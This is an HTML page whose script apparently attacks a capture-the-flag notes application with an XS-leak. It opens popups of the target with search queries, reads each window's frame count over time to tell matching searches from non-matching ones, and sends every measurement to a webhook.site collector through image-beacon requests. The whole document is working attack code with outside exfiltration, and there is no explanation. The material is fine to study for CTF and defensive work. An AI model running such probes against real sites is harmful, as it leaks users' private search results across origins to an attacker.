<!DOCTYPE html>
<html>
<body>
<pre id="log"></pre>
<script>
var CHALL = 'https://notes.chall.lac.tf';
var WH = 'https://webhook.site/c9c4e814-b8d9-47ab-ace4-1afa4d09088f';

function ping(m) { new Image().src = WH + '?' + encodeURIComponent(m); }
function log(m) { document.getElementById('log').textContent += m + '\n'; }
function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }

// Track popup.length over time (every intervalMs for durationMs)
function trackPopup(url, durationMs, intervalMs) {
  return new Promise(function(resolve) {
    var w;
    try { w = window.open(url); } catch(e) {
      resolve({ history: [-1], err: e.message }); return;
    }
    if (!w) { resolve({ history: [-2], err: 'blocked' }); return; }

    var history = [];
    var start = performance.now();
    var iv = setInterval(function() {
      var len = -1;
      try { len = w.length; } catch(e) {}
      history.push(len);
      if (performance.now() - start >= durationMs) {
        clearInterval(iv);
        w.close();
        resolve({ history: history });
      }
    }, intervalMs);
  });
}

// Open popup, wait delayMs, read length, close
function delayedPopup(url, delayMs) {
  return new Promise(function(resolve) {
    var w;
    try { w = window.open(url); } catch(e) {
      resolve({ len: -1 }); return;
    }
    if (!w) { resolve({ len: -2 }); return; }
    setTimeout(function() {
      var len = -1;
      try { len = w.length; } catch(e) {}
      w.close();
      resolve({ len: len });
    }, delayMs);
  });
}

async function run() {
  ping('v11_start');
  var mUrl = CHALL + '/?referrerPolicy=no-referrer';
  var nmUrl = CHALL + '/?referrerPolicy=no-referrer&search=zzzzzzz';

  // === T1: Track popup.length every 100ms for 3s - MATCH ===
  log('T1: track match');
  var t1 = await trackPopup(mUrl, 3000, 100);
  ping('t1=' + t1.history.join(','));
  await sleep(300);

  // === T2: Track popup.length every 100ms for 3s - NOMATCH ===
  log('T2: track nomatch');
  var t2 = await trackPopup(nmUrl, 3000, 100);
  ping('t2=' + t2.history.join(','));
  await sleep(300);

  // === T3: Track hidden match (id=hash-ad-frame) ===
  log('T3: track hidden match');
  var t3 = await trackPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame', 3000, 100);
  ping('t3=' + t3.history.join(','));
  await sleep(300);

  // === T4: Track hidden nomatch ===
  log('T4: track hidden nomatch');
  var t4 = await trackPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame&search=zzzzzzz', 3000, 100);
  ping('t4=' + t4.history.join(','));
  await sleep(300);

  // === T5: Delayed 2s checks - basic (5x match, 5x nomatch) ===
  log('T5: delayed basic');
  var m5 = [], nm5 = [];
  for (var i = 0; i < 5; i++) {
    var r1 = await delayedPopup(mUrl, 2000);
    m5.push(r1.len);
    await sleep(100);
    var r2 = await delayedPopup(nmUrl, 2000);
    nm5.push(r2.len);
    await sleep(100);
  }
  ping('t5m=' + m5.join(',') + '_nm=' + nm5.join(','));

  // === T6: Delayed 2s checks - hidden (5x) ===
  log('T6: delayed hidden');
  var m6 = [], nm6 = [];
  for (var i = 0; i < 5; i++) {
    var r3 = await delayedPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame', 2000);
    m6.push(r3.len);
    await sleep(100);
    var r4 = await delayedPopup(CHALL + '/?id=x&referrerPolicy=hash-ad-frame&search=zzzzzzz', 2000);
    nm6.push(r4.len);
    await sleep(100);
  }
  ping('t6m=' + m6.join(',') + '_nm=' + nm6.join(','));

  // === T7: Delayed 2s checks - lazy (5x) ===
  log('T7: delayed lazy');
  var m7 = [], nm7 = [];
  for (var i = 0; i < 5; i++) {
    var r5 = await delayedPopup(CHALL + '/?loading=x&referrerPolicy=lazy', 2000);
    m7.push(r5.len);
    await sleep(100);
    var r6 = await delayedPopup(CHALL + '/?loading=x&referrerPolicy=lazy&search=zzzzzzz', 2000);
    nm7.push(r6.len);
    await sleep(100);
  }
  ping('t7m=' + m7.join(',') + '_nm=' + nm7.join(','));

  // === T8: Delayed 2s checks - srcdoc override (5x) ===
  log('T8: delayed srcdoc');
  var m8 = [], nm8 = [];
  for (var i = 0; i < 5; i++) {
    var r7 = await delayedPopup(CHALL + '/?srcdoc=x&referrerPolicy=x', 2000);
    m8.push(r7.len);
    await sleep(100);
    var r8 = await delayedPopup(CHALL + '/?srcdoc=x&referrerPolicy=x&search=zzzzzzz', 2000);
    nm8.push(r8.len);
    await sleep(100);
  }
  ping('t8m=' + m8.join(',') + '_nm=' + nm8.join(','));

  ping('v11_done');
  log('Done!');
}
run();
</script>
</body>
</html>
